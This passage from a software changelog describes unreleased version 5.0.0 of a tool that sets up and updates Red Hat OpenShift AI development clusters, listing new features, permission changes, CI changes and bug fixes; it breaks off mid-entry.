# Changelog

All notable changes to the RHOAI Nightly Updater. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
`vMAJOR.MINOR.PATCH`:

- **MAJOR**: the deploy contract changed (`TEMPLATE_REVISION` in
  `deploy/template.yaml`, RBAC, anything that needs the template re-applied).
  Upgrading needs a full redeploy: the release's `install.sh`, or
  `git checkout vX.Y.Z && make upgrade`.
- **MINOR**: features, same template.
- **PATCH**: fixes.

A section reads `- unreleased` until the release commit replaces it with the
release date (`YYYY-MM-DD`); the release guard (`scripts/release.sh check`)
only accepts a tag whose version is the top dated section. Pre-releases of a
version (`vX.Y.Z-alpha.N`, `-beta.N`, `-rc.N`, from 4.1.0 on) are tagged
while its section still reads `- unreleased`, and get no section of their
own. See [CONTRIBUTING.md](CONTRIBUTING.md#releases).

## [5.0.0] - unreleased

Template revision 8: a full redeploy ([UPGRADING.md](docs/UPGRADING.md#upgrade-to-v500)).

### Added

- **Project actions for users who are not cluster-admins.** In one of
  their own data science projects, a project's admins and editors can set
  up, start, stop and delete the workbench, set up and delete the
  playground, and add and remove the MLflow sample data on the Environment
  page. Each action runs with their own token after an access review with
  that token allows every request it can make (the requests are derived
  from the code by the RBAC scan, plus the dashboard's gen-ai API's and
  MLflow's at pinned sources); otherwise it is refused before anything is
  written, naming what is missing and who can grant it. A button the user
  may not use says why (`GET /api/resources/projects/capabilities`).
  Cluster-admins are unchanged, except that the workbench and playground
  actions hold the project's lock instead of the cluster's (an admin's MLflow
  samples action keeps the cluster lock: it may restart the shared MLflow). The activity log shows a user
  their own entries; users' records are capped (100 projects, 10 per user;
  cluster-admins' records are outside the caps). `DEV_ROLE=user` tries the
  non-admin path in local development. No template change
  ([SECURITY.md](SECURITY.md#project-actions-for-non-admins-500)).
- **Project actions: banners, Cancel and their own activity bucket.** A
  running project action shows a banner: to a cluster-admin with who
  started it, to its starter as "Your action (<label>) in project <P> is
  running", and to the other users of that project without a name;
  projects a user cannot see (also one deleted and made again under its
  name) show nothing. A workbench setup, a playground setup and a user's
  MLflow sample changes can be cancelled by whoever started them or a
  cluster-admin (`POST /api/operation/cancel`), after a confirmation that
  says what the action leaves; a cluster-admin's own MLflow sample changes
  hold the cluster lock (they may restart the shared MLflow) and cannot be
  cancelled. A cancel is a request: the action stops at
  its next safe point and keeps what it made as its own failure there
  would; a request in flight always finishes, and an action that finishes
  first is recorded as done. Activity entries now store their scope
  (cluster or project) and the actor's role; users' entries are kept
  apart (40, 5 per user, trimmed first) so they never evict
  cluster-admins' history. A user's cluster-operation banner reads "A
  cluster operation is running since HH:MM. Project actions can start
  when it ends." No template change.
- **Set up again on a model's card.** The Models tab's model card menu has
  **Set up again** next to Delete model: the model's own setup, in place
  (the same model, project and way it is reached), which applies this
  tool's current spec, such as `--enable-force-include-usage`, and publishes
  a model reached through MaaS again when its publication is missing. Its
  confirmation says that KServe restarts the model when its spec changes,
  and which vLLM options change. The messages that said to set a model up
  again on the Models tab had no such action for an existing model. The
  card's **vLLM options** now shows the options the model runs with (they
  were the catalog's), with the catalog's when they differ.
- **Observability: MaaS usage logs and dashboards on the Environment page.**
  A new **Observability** tab (and Overview row) sets up RHOAI's monitoring
  as its docs do (odh-observability `docs/usage-logs.md`,
  `docs/observability-modes.md`): the Cluster Observability Operator, the
  Red Hat build of OpenTelemetry and the Loki Operator (after cert-manager,
  default channels, as odh-gitops installs them), a bucket with a key of
  its own on the tool's S3 storage and the documented Secret, and
  `spec.monitoring.metrics.storage` and `spec.monitoring.usageLogs` (test
  size `1x.demo`, the default StorageClass) in the DSCInitialization, then
  waits for the stack. The cost (about 51Gi of disks) is shown first. It
  flags the collector's missing certificates (a product bug, with the manual
  fix labelled as not in RHOAI's docs) and dashboards Perses has not taken
  yet. Clean up puts back only the recorded fields, then deletes the
  recorded disks and certificates, the Secret, the SeaweedFS user and the
  bucket; the operators stay. The ServiceAccount gains `list` on LokiStacks
  and PersesDashboards, not PersesDatasources ([SECURITY.md](SECURITY.md#observability-usage-logs-and-dashboards)).
  The S3 storage cannot be deleted while usage logs use it.
- **Distributed workloads (Kueue) on the Environment page.** A new
  **Distributed workloads** tab (and Overview row) sets Kueue up exactly as
  the RHOAI docs do with self-managed queues: its prerequisites install the
  cert-manager Operator and the Red Hat build of Kueue from OperatorHub
  (default channel, all namespaces), then set the DataScienceCluster's
  `kueue` to `Unmanaged` and wait for RHOAI's Kueue CR `cluster`. Set up
  creates ResourceFlavor `nightly-kueue-cpu`, a non-preemptive ClusterQueue
  `nightly-kueue` (6 CPUs, 20 GiB) for the chosen project only, LocalQueue
  `nightly-kueue` (never `default`) and the project label
  `kueue.openshift.io/managed=true`, plus optional RayCluster and RayJob
  samples (image editable, default `quay.io/modh/ray:2.47.1-py311-cu121`;
  sized as the CodeFlare SDK's defaults: head 1 CPU / 5 GiB requested, up to
  2 CPUs / 8 GiB, one worker 1 CPU / 3 GiB, up to 6 GiB) for the dashboard's
  Workload metrics and Infrastructure pages (Observe & monitor). An
  opt-in, with its own confirmation, sets the dashboard's `disableKueue` to
  false and adds a Queue hardware profile. Refused when Kueue does not
  serve `v1beta2`, runs outside OLM, or has `labelPolicy: None`. Clean up
  deletes only what the tool recorded and restores what nobody changed;
  the operators stay. The Models tab's hardware profile follows the
  dashboard's Kueue rule in Kueue projects. New user-token rights only; no
  ServiceAccount change.
- **Workbench on the Environment page.** A new **Workbench** tab (and
  Overview row) sets up a Jupyter workbench `nightly-workbench` in a data
  science project exactly as the dashboard's Create workbench does: the
  image RHOAI marks as its default workbench image, the dashboard's default
  hardware profile (with its Kueue rule), its storage size and class, the
  pipeline server's S3 connection by annotation, and nothing the workbench
  controllers add themselves. It shows the dashboard's state (Starting,
  Running, Stopping, Stopped, Failed) with **Open**, **Start**, **Stop**
  (the dashboard's own patches) and **Delete**, which keeps the storage
  `nightly-workbench-storage` unless you tick it; kept storage shows on the
  tab and in Clean up, where it can be deleted on its own. Refused on RHOAI 2.x and
  when no hardware profile fits. Clean up offers the workbenches, storage
  unticked. All reads and writes use your own token (new user-token
  rights only; no ServiceAccount change).
- **Environment recipes (backend, first version).** A recipe
  (`rhoai-nightly-updater/v1alpha1`, YAML or JSON, no secrets) describes a
  dev cluster: an RHOAI build (latest, a nightly line or an image; kept or
  updated when one is installed), the release's default
  DataScienceCluster, a project (created by the recipe or an existing
  one), Pipelines and MLflow. `POST /api/recipes/plan` says what a run
  would do and why it would refuse (one-time setup missing, Argo CD
  managing the operator, a build that does not resolve, a project that is
  not the recipe's, a half installed operator, a part this version does
  not run yet), each refusal with a fix code and the page that fixes it,
  and each step with its typical and longest duration.
  `POST /api/recipes/run` runs it on the server as one operation that holds the cluster lock until its last step, each step
  with its own 15-minute budget and the sign-in checked again before it;
  closing the browser does not stop it, Stop after this step
  (`POST /api/recipes/stop`) does. `POST /api/recipes/resume` continues a
  failed, stopped or interrupted run, skipping what is set up and keeping
  the pinned build and what earlier attempts set up. `GET /api/recipes/run`
  has the run record and, once it ended, its Clean up request as the
  cluster shows it: only what is the run's alone, the project a recipe
  created (its pipeline server goes with it) and the DataScienceCluster
  components the run turned on that are still Managed. The S3 storage,
  MLflow and a pipeline server in an existing project are never in it:
  Clean up everything on the Environment page removes them. All are admin-only and refused in the gitops profile. A project the recipe
  created is removed by Clean up (`recipeProject`) only with its label,
  its recorded UID and every leftover confirmed. No new ServiceAccount
  permission ([SECURITY.md](SECURITY.md#environment-recipes-500),
  [CLUSTER_CHANGES §8](docs/CLUSTER_CHANGES.md#environment-recipes-the-recipe-project-500),
  [RUNBOOK §5.1](RUNBOOK.md#51-environment-recipe-runs-resume-interrupted-sign-in-again)).

- **Recipes page (cluster-admins).** Build a recipe in a form, review what
  the run would do (each step with how long it usually takes and at most,
  each problem with a link to the page that fixes it), then follow the run
  step by step, stop it after a step, resume it, and clean up what is only
  its own: the project the recipe created (with everything in it,
  including its pipeline server, once what it holds is confirmed) and the
  DataScienceCluster components it turned on. The Clean up dialog lists
  what it leaves in place (the S3 storage, MLflow, a pipeline server in an
  existing project) and links to the Environment page.

- **Recipes: every Environment feature, and Dashboard Dev.** A recipe now
  also runs the MLflow samples, Models as a Service (development or
  CloudNativePG database), the Models prerequisites and a catalog model
  in the project (reached the recommended way, through the default
  gateway, through MaaS or only inside the cluster), publishing it
  through MaaS, the playground, the model registry (with its sample
  model), a workbench (with the tool's S3 Connection when the project has
  the pipeline server), distributed workloads (Kueue, as the Distributed
  workloads tab sets them up, with its samples and, off by default, the
  dashboard's cluster-wide Kueue setting) and a Dashboard Dev main or pull
  request build, deployed last. Each step calls what the Environment or Dashboard Dev
  page's own button calls, and checks the cluster first, so a resume
  skips what is set up; how the model is reached is resolved once and
  kept for a resume. New optional recipe fields: `features.modelRegistry`
  (`enabled`, `sample`), `features.workbench` (`enabled`) and
  `features.kueue` (`enabled`, `rayCluster`, `rayJob`, `rayImage`,
  `dashboardOptIn`); recipes without them read as before. Clean up also
  offers, unticked, the MaaS platform, the model registry and the
  distributed workloads setup, but only those the run created: each
  carries the run's annotation from its creation, and is removed only
  while it still has it, the recorded UID and is this tool's. The form has a switch and the
  few options of each feature. A Dashboard Dev pull request whose images
  are not published blocks the plan, and a step counts as done only once
  what it set up works (the model serves, MaaS accepts it, the dashboard
  rolls out). No new permission
  ([RUNBOOK §5.1](RUNBOOK.md#51-environment-recipe-runs-resume-interrupted-sign-in-again)).

- **Pre-releases.** A version can now be tried out before it is released:
  `make release VERSION=v5.0.0-rc.1` tags a pre-release (`-alpha.N`,
  `-beta.N` or `-rc.N`, numbered from 1), on `main` or on an `integ/*`
  branch; the release itself is still tagged on `main` only. A template
  change still needs a new MAJOR version, but it is now checked against the
  last release only: the pre-releases of one version may change the template
  among themselves, so a new major is iterated with pre-releases and
  released once, instead of a new major for every iteration (1.0.0 on
  2026-10-06 to 4.0.0 on 2026-11-20). The release guard wants the
  version's CHANGELOG section still `- unreleased`, the version above the
  last release, and
  `deploy/chart/Chart.yaml` naming the pre-release itself
  (`version: 5.0.0-rc.1`, `appVersion: "v5.0.0-rc.1"`). A pre-release
  publishes its own image tag (`:v5.0.0-rc.1`, written once), `install.sh`
  and release notes that start by saying it is not for general use; it
  never moves `:v5` or `:latest`, and `promote-latest` refuses it. On
  GitHub it is marked as a pre-release and never "Latest", so
  `releases/latest` (the README's install command) stays on the last
  release; GitLab Releases have no such flag, so it is named
  "v5.0.0-rc.1 (pre-release)". The app's update check never offers a
  pre-release; an updater that runs one is offered its release (or a later
  one) once it is out. `install.sh`, `make deploy`/`upgrade` on a
  pre-release checkout, and `make rollback TAG=v5.0.0-rc.1` take
  pre-release versions. The Helm chart's tag check reads pre-release tags
  too: a chart refuses an `IMAGE` tagged with another pre-release or with
  its release (`:v5.0.0-rc.1@sha256:...` in a 5.0.0 chart, and the other
  way round), since their templates may differ; before, a tag with a suffix
  passed the check. How to: [CONTRIBUTING.md](CONTRIBUTING.md#pre-releases).
- **Model registry on the Environment page.** A Model registry tab (and an
  Overview row) sets up one registry, `nightly-registry`, as the
  dashboard's Create model registry dialog does with the default database,
  so it shows in the dashboard; it first turns on the DataScienceCluster
  component that runs registries (`aiHub` on RHOAI 3.6, `modelregistry`
  before) when needed. Set up can register a sample model (the Models
  tab's model) as the dashboard's Register model form does. Delete and
  Clean up remove only the registry this tool created, with its database
  and registered models. Clean up can also turn the component back off
  (it says that `aiHub` also removes the Model Catalog), only when this
  tool turned it on and no registry is left. New user-token requests only
  (create, get, delete and, for that check, list ModelRegistries; get the
  registry's Service); the ServiceAccount's RBAC is unchanged.

### Changed

- **Diagnostics: the JobSet Operator's commands install cert-manager
  first.** The OpenShift documentation installs the cert-manager Operator
  for Red Hat OpenShift before the JobSet Operator (and odh-gitops installs
  them together), but the JobSet bundle declares no OLM dependency, so the
  printed commands left it out. When cert-manager is not installed they now
  install it first (from the cluster's catalog, as its own problem does),
  in a block of its own that must succeed before the JobSet block runs
  (each a subshell with `set -e`, so a failed step neither starts JobSet
  nor closes the shell), and each instruction names its operator;
  while its install runs they wait for it; when it is installed the
  evidence says so. `JobSetOperator/cluster` is still created from the
  CSV's example when it is missing.
- **Components: Create says what a missing prerequisite operator does.**
  The Create DataScienceCluster preview says that a component reporting a
  prerequisite operator as not installed stays not ready until an
  administrator installs it, and where the page and Diagnostics show it.
  The create's result now stays on the page once the DataScienceCluster
  exists (it disappeared with the empty state), above the live rows, with
  the same pointer. Create itself does not wait: the rows show each
  component as RHOAI reports it.
- **The recipe's DataScienceCluster step lists the components that are not
  ready.** After it creates the release's default DataScienceCluster, the
  step also waits, within the same 5 minutes as for the DataScienceCluster's
  conditions (never for Ready), until every component CR in
  `components.platform.opendatahub.io` has reported its own conditions for
  its current generation (proven by the status or by its `Ready` or
  `ProvisioningSucceeded` condition). Its result then lists each component
  whose own `ProvisioningSucceeded` or `Ready` is not True, with that condition's
  reason and message as RHOAI wrote them (provisioning failures first, such
  as trainer's "dependency not met: JobSet Operator is not installed" on a
  cluster without JobSet: RHOAI's default turns trainer on, and RHOAI does
  not install JobSet), names those that have not reported yet, and still
  succeeds. No component is named in the code.
- **Setups refuse when the DataScienceCluster cannot be read.** Setting up a
  pipeline server or MLflow used to go ahead when the DataScienceCluster
  could not be read; it now stops before any change with
  `prerequisites_unknown` ("Blocked: prerequisites could not be checked").
  A served version whose objects the conversion webhook cannot convert (a
  500, or a 429 from the watch cache, naming the webhook) is still skipped
  for the next one; any other error (a plain 500, 403, a network error)
  blocks, as does a conversion failure at every version. Cluster facts a change needs
  (RHOAI's namespaces, component states, the control plane, the dashboard's
  and MLflow's addresses) are read with the ServiceAccount's read-only
  facts client; the ServiceAccount gains no permission.
- **Operation locks prepared for project actions (no visible change).** The
  cluster lock is one entry of a lock table now: project locks (by namespace
  UID) are entries of the same operation ConfigMap, a cluster operation and a
  project action refuse each other, one project action runs per user and at
  most 20 at once (no route takes a project lock yet). Each updater pod writes
  the operation and activity ConfigMaps through one writer, so it never
  conflicts with itself; one heartbeat renews all of a pod's locks in one
  tested JSON patch, and losing one stops only its operation. `GET
  /api/operation` adds `operations`, the list of running and interrupted
  operations; the earlier fields are unchanged. No new permission.

- **No "..." after button labels and progress text.** Buttons and menu
  items that open a dialog read as their action (**Clean up everything**,
  **Turn back**, **Install**, **Delete workbench**), progress and loading
  text is a plain phrase beside its spinner ("Loading builds"), and a
  reason shown among sentences is one ("Checking your permissions."), as
  PatternFly writes them: an ellipsis there marks only omitted or
  truncated text. The step messages of every Environment, Recipes and
  Status operation lost theirs too. ESLint now fails on a frontend string
  that ends with one.
- **Recipes set up what every feature needs in one step.** A recipe run
  had a prerequisites step per feature (What Pipelines needs, What MLflow
  needs, What Models needs, ...), each with its own operator installs and
  readiness wait, one after the other. One step, **What the features
  need**, right after the project, now does it for all of them at once:
  every check and dry run first, then every DataScienceCluster component,
  every missing operator (cert-manager, Connectivity Link, the Red Hat
  build of Kueue), waited for together, and one wait until everything is
  ready. Each component is still recorded for its own feature, so the
  Environment tabs' Clean up turns it back as before. Kueue's component
  is still turned on late, by **What distributed workloads need**; with no
  `models.exposure`, **What the model's access needs** adds what the
  resolved way needs after the MaaS step. A run recorded by an earlier
  version resumes with the new steps, keeping the components it turned on.
- **Recipe steps that do not depend on each other run at the same time.**
  After RHOAI, the DataScienceCluster, the project and what the features
  need (still one after another), the features run in lanes side by side,
  at most three steps at once: S3 storage, the pipeline server and the
  workbench; MLflow and its samples; the model registry; and serving as
  one lane (Models as a Service, the model's access, the model, its MaaS
  publication and the playground, which share Connectivity Link and the
  gateway). Distributed workloads come after every other feature, as the
  dashboard's Kueue setting changes how workbenches and models are
  created, and Dashboard Dev stays last. The review's time estimate is the
  longest chain of steps instead of their sum. The Recipes page shows
  "4 of 17 steps done; running: Pipeline server, MLflow, Models as a
  Service", each running step with its own progress; Stop becomes **Stop
  after the running steps** while several run: they finish and nothing
  else starts. A failure starts no more steps either: the running ones
  finish, then the run ends failed, naming the first failed step with its
  message and every other one that failed. Each step keeps its own 15
  minutes. Resume runs every step that did not end well, also for a run
  recorded by an earlier version. While a run ends after a failure or
  Stop, the card says so at once ("Pipeline server failed: ... No other
  step starts; Models as a Service finishes first, then the run stops").
  The project step ends only once OpenShift lists the new project among
  your data science projects (its project list lags by about a second),
  so the steps that start right after it find it.
  A refusal for any feature (a GitOps-managed DataScienceCluster, an
  operator that cannot be installed, a dry run the API server rejects)
  now stops the step for all of them, before any change (one exception:
  the Kuadrant CR of a Connectivity Link the step installs itself can be
  dry-run only after that install). The MaaS tab
  shows a Connectivity Link and Kuadrant CR the step installed as this
  tool's ([RUNBOOK §5.1](RUNBOOK.md#51-environment-recipe-runs-resume-interrupted-sign-in-again)).

- **The S3 storage has its own Environment tab.** It was part of the
  Pipelines tab; it is the cluster's, and other features can use it too,
  so it now has an **S3 storage** tab (`?tab=storage`, no project picker)
  with its health, endpoint, keys, admin UI login, **Migrate storage**,
  **Delete old storage**, **Repair**, **Delete S3 storage** and its own
  **Set up S3 storage**, and a row of its own on the Overview. The
  Pipelines tab shows the storage's health only, with **Open S3
  storage**, and while a migration is needed a short alert that points
  there. **Set up Pipelines** still sets the storage up first when it is
  missing; **Show issue** for the storage, from either row, opens the S3
  storage tab. **Clean up Pipelines** now deletes only pipeline servers:
  the S3 storage goes only with **Delete S3 storage** or **Clean up
  everything**. A recipe project's "holds what this tool did not create"
  confirmation says that only Notebooks, InferenceServices,
  LLMInferenceServices, PersistentVolumeClaims and Pods are listed, and anything else in the project is deleted with it. While an
  earlier version's storage still holds the data, the S3 storage, its
  SeaweedFS part, the Pipelines tab and both Overview rows all read
  **Migration needed**, and only the S3 storage tab offers **Migrate
  storage**. No API or permission changed.
- **Every RHOAI user can sign in, and sees what is theirs.** oauth-proxy's
  sign-in gate is now "may `get` `auths.services.platform.opendatahub.io`",
  which RHOAI grants to its Auth CR's allowed groups (by default every
  OpenShift user); before, only users who could list pods in
  `redhat-ods-operator` got in. Cluster-admins see everything as before.
  Everyone else gets a reviewed cluster summary (new `GET /api/summary`:
  the updater's version, RHOAI's version, channel and phase, the installed
  and newest nightly build, the DataScienceCluster and its components),
  Build Explorer, and the Environment page for their own projects, read
  with their own token. Every other read answers 403 `admin_only`; a GET
  route nobody classified is admin-only, and a test fails until it is
  classified ([SECURITY.md](SECURITY.md#per-user-views-500)). Their Help
  dialog describes only the pages they can open, with no update or upgrade
  steps. The README shows these pages
  ([Not a cluster-admin?](README.md#not-a-cluster-admin-what-you-see)).
- `GET /api/user/permissions` reports `role`: `admin` or `user`.
- `GET /api/operation` gives a user who is not a cluster-admin only
  `{running, label, startedAt}`: never who started it or what it acts on.
- The projects list (`GET /api/resources/projects`) comes from the
  OpenShift projects API with the user's own token, for everyone; the
  Playground and MLflow samples status read with the user's own token
  (the Playground's projects are the user's only), and a user who is not a
  cluster-admin gets `GET /api/resources/status?project=` for one of their
  projects, read with their token.
- A refusal of a read made with the user's own token is
  `forbidden_for_user` ("your account may not see this"), never the
  ServiceAccount's "re-apply the template" hint.
- CI: every job has a timeout. GitLab: 20 minutes for the test jobs, 30
  for the image builds, 10 for the crane, installer and release-notes
  jobs; GitHub: 20 minutes per job, 45 for the release job. The crane jobs
  take crane v0.22.1 from its release tarball, checked against its
  SHA-256, instead of `go install` from a Go cache that a branch pipeline
  could write, right before `crane auth login`. GitHub checkouts no longer
  keep the token in `.git/config` (`persist-credentials: false`).
- Internal, CI only: faster pipelines with every check kept. The image
  jobs (`build-main`, `release-build`) start with the test jobs and only
  build a tarball; the publish jobs wait for every test job (on a tag also
  the release guard) and the build, so nothing is pushed unless all of
  them passed. The docs, chart and script checks run in two jobs instead
  of four (`checks`, `script-tests`), since each job waited about two
  minutes for its runner. Tag pipelines only read the Go caches. The npm
  cache is restored again: without a key prefix GitLab named it after the
  lock file's path, and the runner refused to restore a key with a `/`.
  The race tests run the shared fake API servers in memory (no TLS, no
  sockets) and split `pkg/cluster` over up to four processes
  (`scripts/test-go.sh`).
- The CI jobs' checks are Makefile targets, so they run the same way
  locally: `make ci-go` (gofmt, `go mod verify`, `go vet`, the race tests,
  govulncheck; GitHub's `go` job runs it too, so it now verifies the
  modules as well), `make -k ci-checks`, `make -k ci-script-tests` and
  `make release-check TAG=vX.Y.Z`. The frontend targets say when
  `frontend/node_modules` is missing (`cd frontend && npm ci`) instead of
  failing on a TypeScript option.
- Internal, frontend only: ESLint reads the TypeScript types and checks
  promises (none left unhandled, none passed where nothing waits for them),
  `await` of non-promises, switch exhaustiveness and object-to-string
  conversions. The Environment page's component (`QuickResourceCreator`,
  1,011 lines) is split into its URL state, status reads, run actions and
  their requests (`frontend/src/components/environment/`), and repeated UI
  pieces (outcome alerts, the Dashboard Dev session alert, Open
  Diagnostics, Go to Status) are one component each. No change in what
  the app does.
- Internal, backend only: `pkg/cluster` (about 120 files in one package)
  is split into 20 packages under `pkg/cluster/internal/` (the API client,
  the records, the registry reads, the components, the operator
  operations, serving, the DataScienceCluster writes, Diagnostics, ...),
  each importing only the ones below it; `pkg/cluster` is a facade over
  them plus the views that combine several (CONTRIBUTING.md, "Backend
  layout"). No change in what the app does or asks the cluster for: the
  HTTP handlers are untouched, the RBAC scan's list of requests is the
  same (one user-token read is now named by its new file), the frontend
  contract fixtures are byte-identical, and every test still runs.
  `scripts/test-go.sh` runs the packages' race test binaries side by side:
  on 2 CPUs with a warm build cache the Go job's tests take about as long
  as before the split (35 s against 34 s in the CI image) and use less CPU.
- The Environment page's load failure reads "Can't load the environment",
  like every other page's ("Cannot load the environment" before).

### Fixed

- **A workbench setup that reaches its deadline right after a create**
  records the object as this tool's (or deletes it again), on the
  post-operation context, instead of leaving it unrecorded.
- **Update waits for OLM's result instead of a fixed time, and says why
  OLM has not resolved yet.** On a ROSA HCP cluster an Update failed after
  8 minutes with "last state: Waiting for OLM to resolve the Subscription":
  OLM's bundle unpack pod could not pull the operator bundle
  (`ImagePullBackOff`, `manifest unknown`) on a node that did not have the
  `quay.io/rhoai` credentials yet, and the Job's next pod, on a new node,
  started 16 seconds after the tool gave up and restored the previous
  operator. OLM on OpenShift 4.22 and older reports no failure on the
  Subscription before its bundle unpack timeout, which each cluster sets
  (the catalog operator's flag, not visible on a hosted control plane, or
  an OperatorGroup annotation); until then `BundleUnpacking` reads only
  `UnpackingInProgress`. The install wait of Update, Update under Argo CD,
  Re-deploy and Install a different build now assumes no OLM timeout: it
  ends on OLM's result (the CSV `Succeeded`, `ResolutionFailed`,
  `BundleUnpackFailed`, a failed InstallPlan or CSV) or when the
  operation's time runs out (10 seconds before its 15-minute deadline). A
  failing bundle pull no longer fails the operation after 3 minutes (the
  OpenShift 4.23 message on `BundleUnpacking`): OLM keeps retrying, and the
  pull can recover. Its error code `bundle_image_pull` is retired: such an
  install now ends with `bundle_unpack_failed` when OLM gives up, or with
  `install_timeout` when the operation's time runs out. Until then a bundle
  that cannot be pulled holds the operation, and with it the cluster's
  operation lock, for up to the 15-minute operation deadline, as any step
  can. While OLM resolves, the progress shows the
  Subscription's conditions; while OLM unpacks, every OLM bundle unpack pod
  in the namespace of the Subscription's CatalogSource that cannot pull,
  with its image, the kubelet's reason and a hint at the kind of error (for
  example "an OLM bundle unpack in openshift-marketplace cannot pull
  registry.redhat.io/rhoai/...: ImagePullBackOff (manifest unknown)"; the
  registry's own message is never quoted, neither from the pod nor from
  the Subscription's `BundleUnpacking` and `BundleUnpackFailed` messages,
  as it can carry a signed URL), and the OperatorGroup's
  `operatorframework.io/bundle-unpack-timeout` annotation, if it has one.
  Every read of the wait ends at its cutoff, so a slow API server cannot
  eat the 10 seconds kept before the deadline. A
  wait that ends while OLM still unpacks says so and how to check. The
  Update confirmation says when the new state is kept (OLM created an
  InstallPlan and no CSV failed) and that the previous one is restored
  otherwise. No new permission: the pod list was already read for the
  catalog pod, the OperatorGroup list for the install's checks.

- **Models: the inference gateway says when Authorino serves no TLS, and
  the call check names the gateway's authorization on a gateway 500.** With
  the gateway's AuthPolicy enforced, the Models tab read only that, and
  showed "Authentication: On" while every call answered HTTP 500 (live,
  Connectivity Link 1.5.0 installed for all namespaces). RHOAI's setup of
  authentication for llm-d turns on TLS on Authorino's listener, and
  odh-model-controller points the gateway at Authorino over TLS whenever it
  read Authorino's TLS as on or found no Authorino, and keeps that after it
  reads TLS as off. The gateway now reads Kuadrant's Authorino (in the
  Kuadrant CR's namespace) and, without TLS, says calls can fail with 500
  and shows RHOAI's steps for a cluster-admin; it changes nothing. A 500
  with an empty body, or Kuadrant's own "Internal Server Error.", is
  reported as the gateway's failure, with what Authorino says, instead of
  a bare "Internal Server Error". No new permission.

- **The tool names itself to the API server.** Every request now sends
  `User-Agent: rhoai-nightly-updater-client/<version>`, so audit logs name
  the tool, and writes without a field manager are recorded as
  `rhoai-nightly-updater-client` instead of Go's default `Go-http-client`.
  That default now counts as the tool's only for objects that only earlier
  versions wrote: namespace `minio`, its pipeline server `dspa` and Secret
  `dashboard-dspa-secret`. A Secret of a current name without the tool's
  label that only `Go-http-client` wrote is no longer deleted with a
  pipeline server.
- **The MaaS portal says when it waits for Dashboard Dev.** RHOAI's
  dashboard operator deploys the portal, and a Dashboard Dev session keeps
  that operator at 0 replicas, so a portal turned on during a session
  stayed "not yet" with no reason. Turning it on is still allowed; while a
  recorded Dashboard Dev session keeps the operator at 0 replicas and the
  portal is not available, its result and the MaaS tab's portal row now say
  that it comes up once Dashboard Dev is reverted.
- **Update waits until the catalog serves the verified build.** After
  replacing the nightly catalog, Update waited for READY and up to 30
  seconds for its channels, then detected the channel again. It now waits,
  as on a cluster managed from Git, until OLM's registry pod runs the new
  image, the catalog is READY and its PackageManifest lists the verified
  head (same build) on the verified channel, and uses that channel. A
  catalog that does not serve it in time stops Update before the old CSV is
  deleted ("The catalog did not serve ... The operator was not changed"),
  and the previous catalog and Subscription are restored.
- **Update installs exactly the build it verified.** Like Update on a
  cluster managed from Git, Update now pins the new Subscription's
  `startingCSV` to the head CSV the verification catalog listed, so OLM
  installs that CSV or reports that the catalog lacks it; a catalog that
  changed after verification cannot put another build in its place.
- **Secure S3 storage no longer says a pipeline server uses its new key
  before it does.** The pipeline API server reads its S3 key from
  environment variables only when it starts (DSPO `deployment.yaml.tmpl`
  `secretKeyRef`; its config hash leaves credentials out), so a pipeline
  server given its own key keeps the old, revoked one until its pods
  restart. While a pipeline server's API server pod started before the
  tool last wrote its key (pod start time against the Secret's
  managedFields time), its step and the result say so, also on a later
  run, and the dialog gives the restart command to copy
  (`oc delete pod -n <project> -l app=ds-pipeline-<dspa>,dspa=<dspa>`).
  The tool does not restart them itself: that would need a new permission.
- **The installer refuses clusters with external OIDC sign-in.** On a
  cluster set up for direct authentication with an external OIDC provider
  (`authentications.config.openshift.io/cluster` `spec.type: OIDC`),
  OpenShift turns off its OAuth server and the OAuth and user APIs
  (openshift-docs `external-auth-disabled-resources.adoc`), which the app's
  sign-in, OAuthClient, `users/~` and `useroauthaccesstokens` need.
  `install.sh` (deploy, upgrade, rollback) now reads that type with your
  `oc` and stops with that reason before changing anything, instead of
  failing part-way or leaving an app nobody can sign in to. Documented in
  the README, SECURITY.md and GITOPS.md (the chart cannot check).
- **Gateway setup fails when the gateway gets no load balancer address.**
  Setting up the inference gateway or MaaS reported success ("may still
  come up") when the cluster gave the gateway no load balancer address,
  although nothing outside the cluster could reach it (bare metal without
  MetalLB, for example). Both now fail at the gateway step with the reason;
  the inference gateway's setup then sets up no model, and MaaS stops
  before the DataScienceCluster. A hostname OpenShift has not published in
  DNS (no DNS zone, still pending, or unreadable) stays a success, now with
  a warning that says what to check. An OpenShift Route in front of a
  ClusterIP gateway (the MaaS docs' `INGRESS_MODE=ocproute`, odh-gitops'
  `openshiftRoute`) is not supported by this tool yet.
- **MaaS token limits count streamed chats.** The Models tab's chat models
  now run with vLLM's `--enable-force-include-usage` (appended to
  `VLLM_ADDITIONAL_ARGS`), as the MaaS docs require for token rate limits
  (models-as-a-service `quota-and-access-configuration.md`, "Model server
  must include usage data"). Without it a streamed chat reported no usage,
  so MaaS counted 0 tokens, limits never returned 429 and usage logs read 0.
  The embedding model is unchanged. A model set up by an earlier version
  lacks the flag: Publish refuses it as changed until you set it up again
  on the Models tab, which restarts it; one already published keeps
  counting 0 for streams until it is set up again, and its row on the MaaS
  tab warns about it until then (nothing is changed automatically).
- **A model reached through MaaS only is published while its server still
  starts.** The Models tab's setup (and an environment recipe's model step)
  published such a model only when its server ran within the setup's
  10-minute wait. A slower start (10m21s live, mostly a slow Hugging Face
  download) ended in success ("It may still start") without the
  publication, and the model could then never become Ready: its route needs
  the MaaS gateway to admit the project, which only a publication does. The
  recipe's model step then waited until its deadline. Setup now publishes it
  when the wait ends, as the MaaS docs order it (deploy, admit the namespace,
  add the MaaSModelRef; Ready is not asked first), and the wait for MaaS to
  accept it ends before the operation's deadline. A start that failed, or an
  image pull still failing, is not published: set the model up again (or
  Resume the run) once the pull succeeds. The "Can it be called?" check points to
  setting the model up again on the Models tab, and the confirmation of the
  MaaS tab's **Restore direct routing** says how to publish the model again:
  set up on the Models tab through MaaS only, set it up again there (or
  restore, then Publish); published from the MaaS tab, restore, then
  Publish.
- **Dry runs of a delete no longer delete.** Five deletes asked for a
  server-side dry run in the URL (`?dryRun=All`) while sending
  DeleteOptions (UID preconditions) in the body, and the API server then
  reads only the body's options (k8s.io/apiserver
  `pkg/endpoints/handlers/delete.go:95-128`, v0.35+), so each "dry run" was
  a real delete. What that did in released versions:
  - **Removing the image mirror (v4.0.0 to v5.0.0-alpha.2):** opening the
    review of **Remove the image mirror** (Status page; self-managed, ROSA
    Classic and OSD clusters only) deleted ImageDigestMirrorSet
    `rhoai-quay-mirror` at once, also when you then clicked Cancel, and
